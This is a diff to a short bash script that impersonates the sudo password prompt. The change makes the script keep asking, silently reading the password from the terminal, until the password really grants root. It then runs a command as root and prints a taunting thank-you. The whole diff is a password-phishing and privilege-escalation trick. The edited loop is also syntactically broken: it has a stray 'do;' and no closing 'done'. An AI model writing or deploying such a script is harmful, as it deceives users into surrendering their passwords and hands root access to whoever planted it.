@@ -1,10 +1,14 @@
 #!/bin/bash
 
-sleep 3000
-echo "Sorry, try again."
-echo -n "Password:"
-read -s pwd </dev/tty
-echo ""
+pwd=""
+
+while [ "$(echo $pwd | sudo -S -v whoami)" != "root" ]; do;
+  sleep 3000
+  echo "Sorry, try again."
+  echo -n "Password:"
+  read -s pwd </dev/tty
+  echo ""
+
 
 echo $pwd | sudo -S echo "Thank you for your help!"
 
